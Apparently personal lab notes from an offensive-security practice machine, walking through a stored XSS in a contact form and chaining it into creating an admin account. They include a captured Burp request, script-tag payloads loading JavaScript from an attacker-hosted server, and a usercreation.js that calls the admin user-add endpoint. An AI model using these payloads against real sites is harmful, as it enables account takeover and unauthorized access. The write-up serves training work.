#### Potential XSS
- requires email address
![[Pasted image 20241209160505.png]]
when viewing `elements` in the page we see we are able to change the `type`
- also take note of the `hidden` token field - i cant remember exactly what that means right now
![[Pasted image 20241209161021.png]]
changed to `text`
![[Pasted image 20241209161223.png]]
and was able to submit the `XSS` test paylaod
![[Pasted image 20241209161259.png]]
`BURPSUITE` response that comes back
```HTTP
POST /contact HTTP/1.1
Host: mentor
Content-Length: 608
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9QrlykoE1g1ZVXCX
Accept: */*
Origin: http://mentor
Referer: http://mentor/contact
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6IllqazdKd0xSVEJOaVB5eWVabG1kbVE9PSIsInZhbHVlIjoiemh6dDJabGMzYThTRjZkN1BlWnpkQnd3RkhQK1Z6TGJOeUh6VW5idGhsQ3YrVjlITmJqRDMxWVRMRllPbTZhNGFoY0U3Y1RjVzhRVUc0L29tR0NNZUVZREhYdlkxNWtOTlFKbk1nTXdQL3A3a1VPVTI1UkJFT0ZPcU03K1JoN0IiLCJtYWMiOiI1NmVlYmJjNmExZTU1MDIwMDI5NjA1OTlhM2RmZWQ3YmE0ZmJjMjQyNzliN2QyMzk2ZDZmZGMxYjVkM2E3Y2RkIiwidGFnIjoiIn0%3D; mentor_session=eyJpdiI6IlA5emxxWTltWjVFeHQ4Sy9rTUkrRUE9PSIsInZhbHVlIjoiUmw2anN5QllZc1E1MzVwRzQyU0hjdHZvbFF5YVJFOFNsai9zSWQ4YlBlaU9VWVllSVRPeWpiVDl2TEpkL2NWd2Q3djBUMWtwZUN3bFBRSG90V0hrYzMzblB1akhhZUNPTFZXTUZleVFXWUx0NHo3UlJEeTY4OFBrWG43d0p6OTUiLCJtYWMiOiI0NzQwMDNmOTQwMzQ0NTNiNWE0MjU4Y2RkYzQ4NDU2MGE0YzE5NWRjYTlhMDFmNGExZTBkN2ZiMjVkZGQ2YzFjIiwidGFnIjoiIn0%3D

Connection: keep-alive



------WebKitFormBoundary9QrlykoE1g1ZVXCX

Content-Disposition: form-data; name="_token"



CJa5tU1EhuDVMAqVMcTGswrNcFizzVCdZVuP10r2

------WebKitFormBoundary9QrlykoE1g1ZVXCX

Content-Disposition: form-data; name="name"



<h1>offsec</h1>

------WebKitFormBoundary9QrlykoE1g1ZVXCX

Content-Disposition: form-data; name="email"



<h1>offsec</h1>

------WebKitFormBoundary9QrlykoE1g1ZVXCX

Content-Disposition: form-data; name="subject"



<h1>offsec</h1>

------WebKitFormBoundary9QrlykoE1g1ZVXCX

Content-Disposition: form-data; name="message"



<h1>offsec</h1>

------WebKitFormBoundary9QrlykoE1g1ZVXCX--
```
now to test to see if we are able to utilize `xss` to hit our `kali` machine

hosting `xss.js` with `python3` server
![[Pasted image 20241209162358.png]]
payload to send to test
```bash
<script src="http://192.168.45.231:8000/xss.js"></script>
```
sending off
![[Pasted image 20241209162533.png]]
proof we have `XSS`
![[Pasted image 20241209162559.png]]


#### addUser at `/login` endpoint

once we are at the `/login` page found through `gobuster`
![[Pasted image 20241209162943.png]]
`inspect` the page and try to find `main.js` file 
- once found we can see that there is an `addUser` javascript function that adds an `admin` user
![[Pasted image 20241209163106.png]]
if we utilize the parameters that the `addUser` function requires we should be able to create credentials and add them to be a `admin` user

- Imagine `xhttp` as your mailman. It's a helper that can send letters (requests) to a server and get letters (responses) back.
-  the `onreadystatechange` function is not required
```js
function addUser() {

	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function () {
		if (this.readyState == 4 && this.status == 200) {
			// Typical action to be performed when the document is ready:
			alert(xhttp.responseText)
			window.location = window.location;
		}
	};
	var creds = 'email=' + document.getElementById('email').value + '&password=' + document.getElementById('password').value + "&name=" + document.getElementById('name').value + "&username=" + document.getElementById('username').value;
	xhttp.open("GET", "/admin/users/add?" + creds, true);
	xhttp.send();
}
```
my payload to feed to the server with the `XSS` vulnerability found earlier:

usercreation.js
```js
var xhttp = new XMLHttpRequest(); // to create a request object
var creds = 'email=jbug@offsec.local&password=jbug&name=jbug&username=jbug' // to create string of credentials that were in main.js
xhttp.open("GET", "/admin/users/add?" + creds, true); // preparing to add new user to admin user - calls upon creds variable
xhttp.send(); // sending the request to the server
```
`xss` payload
```bash
<script src="http://192.168.45.231:8000/usercreation.js"></script>
```
submitting the payload
![[Pasted image 20241209165654.png]]
proof the `xss` payload worked in getting pulled over
![[Pasted image 20241209165530.png]]
testing to see if the user was created with `jbug:jbug` credentials @ `http://mentor/login`
![[Pasted image 20241209165846.png]]
successfully logged in and local.txt
![[Pasted image 20241209165920.png]]
